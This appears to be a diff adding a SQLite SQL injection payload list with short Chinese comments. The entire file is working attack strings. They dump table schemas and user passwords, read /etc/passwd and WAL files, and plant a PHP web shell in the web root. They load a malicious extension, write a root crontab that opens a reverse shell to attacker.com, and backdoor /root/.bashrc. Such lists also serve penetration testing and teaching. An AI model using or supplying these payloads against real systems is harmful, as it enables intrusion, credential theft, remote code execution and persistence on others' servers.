@@ -1,0 +1,20 @@
+# SQLite - 提取所有表名
+' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'--
+# SQLite - 提取表结构 (DDL)
+' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table' AND name='users'--
+# SQLite - 提取所有用户数据
+' UNION SELECT 1,group_concat(username||':'||password),3 FROM users--
+# SQLite - 写文件 (ATTACH DATABASE)
+'; ATTACH DATABASE '/var/www/html/shell.php' AS shell; CREATE TABLE shell.pwn (dataz TEXT); INSERT INTO shell.pwn VALUES ('<?php system($_GET[1]);?>'); DETACH DATABASE shell--
+# SQLite - 读文件 (readfile)
+' UNION SELECT 1,readfile('/etc/passwd'),3--
+# SQLite - 报错注入 (RAISE)
+' AND (SELECT CASE WHEN (SELECT sql FROM sqlite_master LIMIT 1) LIKE '%password%' THEN RAISE(ABORT,'LEAK') ELSE 1 END)--
+# SQLite - 创建恶意函数 load_extension
+'; SELECT load_extension('/tmp/evil.so')--
+# SQLite - 写 crontab 定时任务
+'; ATTACH DATABASE '/var/spool/cron/crontabs/root' AS c; CREATE TABLE c.t (data TEXT); INSERT INTO c.t VALUES ('* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1'); DETACH DATABASE c--
+# SQLite - 覆盖 .bashrc 持久化
+'; ATTACH DATABASE '/root/.bashrc' AS brc; CREATE TABLE brc.x (d TEXT); INSERT INTO brc.x VALUES ('/tmp/backdoor&'); DETACH DATABASE brc--
+# SQLite - 注入获取 WAL 日志中的敏感数据
+' UNION SELECT 1,hex(readfile('/var/www/html/db.sqlite-wal')),3--
